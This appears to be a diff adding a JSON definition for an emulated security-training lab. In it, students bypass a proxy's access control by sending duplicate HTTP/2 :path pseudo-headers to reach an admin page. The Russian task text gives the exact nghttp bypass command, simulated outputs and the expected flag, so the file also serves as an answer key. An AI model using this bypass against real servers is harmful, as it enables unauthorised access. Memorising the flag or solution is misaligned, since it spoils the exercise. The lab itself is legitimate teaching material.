@@ -1,0 +1,28 @@
+{
+  "id": "web-http2-attacks",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{h2_p53ud0_p4th_dup_byp4ss}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: HTTP/2 pseudo-header injection\n\n`shop.local` принимает HTTP/2, но перед бэкендом терминатор переводит H2 в\nH1.1. Псевдо-заголовок `:path` не дедуплицируется: прокси видит первый,\nбэкенд — последний.\n\n1. Подтверди HTTP/2:\n\n   curl -sI --http2 https://shop.local/\n\n2. Отправь запрос с ДВУМЯ `:path` через nghttp — прокси увидит `/safe`,\n   бэкенд уйдёт на `/admin`:\n\n   nghttp -H':path: /safe' -H':path: /admin' https://shop.local\n\n3. Ответ админки содержит флаг. Запиши в `found.txt` и набери `check`.\n" }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.local)",
+      "cases": [
+        { "match": "http2", "example": "-sI --http2 https://shop.local/", "output": "HTTP/2 200\ncontent-type: text/html\nserver: shop-h2\n" },
+        { "match": "upgrade|h2c", "example": "--http2-prior-knowledge https://shop.local/", "output": "HTTP/1.1 101 Switching Protocols\nUpgrade: h2c\nConnection: Upgrade\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только H2-фасад shop.local.\n"
+    },
+    "nghttp": {
+      "help": "nghttp [-H ':path: /x'] <url> — H2-клиент (эмуляция shop.local)",
+      "cases": [
+        { "match": "admin", "example": "-H':path: /safe' -H':path: /admin' https://shop.local", "output": "[  0.001] send SETTINGS frame\n[  0.002] recv HEADERS frame for stream 1\n:status: 200\ncontent-type: text/html\n\n<h1>Internal Admin</h1>\nnto{h2_p53ud0_p4th_dup_byp4ss}\n" },
+        { "match": "safe", "example": "-H':path: /safe' https://shop.local", "output": "[  0.001] recv HEADERS frame for stream 1\n:status: 200\n\n<h1>shop.local</h1>\n" }
+      ],
+      "fallback": "nghttp: в этой лабе эмулируется только shop.local (:path /safe и /admin).\n"
+    }
+  }
+}
